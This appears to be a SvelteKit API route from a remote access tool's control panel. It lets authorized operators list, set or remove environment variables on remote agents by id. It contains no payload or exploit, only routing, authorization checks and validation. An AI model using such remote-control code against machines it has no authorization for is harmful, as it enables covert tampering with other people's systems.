import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { requireOperator, requireViewer } from '$lib/server/authorization';
import { dispatchEnvironmentCommand, EnvironmentAgentError } from '$lib/server/rat/environment';
import {
	environmentCommandRequestSchema,
	type EnvironmentMutationResult,
	type EnvironmentSnapshot
} from '$lib/types/environment';

export const GET: RequestHandler = async ({ params, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	requireViewer(locals.user);

	try {
		const snapshot = await dispatchEnvironmentCommand(id, {
			action: 'list',
			timestamp: new Date().toISOString()
		});
		return json(snapshot satisfies EnvironmentSnapshot);
	} catch (err) {
		if (err instanceof EnvironmentAgentError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to load environment variables');
	}
};

export const POST: RequestHandler = async ({ params, request, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const user = requireOperator(locals.user);

	let payload: unknown;
	try {
		payload = await request.json();
	} catch {
		throw error(400, 'Invalid environment command payload');
	}

	let command = environmentCommandRequestSchema.parse(payload);
	if (command.action === 'list') {
		throw error(405, 'Use GET to fetch environment variables');
	}

	command = {
		...command,
		key: command.key.trim(),
		...(command.action === 'set' ? { value: command.value } : {}),
		timestamp: new Date().toISOString()
	} as typeof command;

	if (command.key.length === 0) {
		throw error(400, 'Environment variable key is required');
	}

	try {
		const result = await dispatchEnvironmentCommand(id, command, {
			operatorId: user.id
		});
		return json(result satisfies EnvironmentMutationResult);
	} catch (err) {
		if (err instanceof EnvironmentAgentError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to apply environment mutation');
	}
};
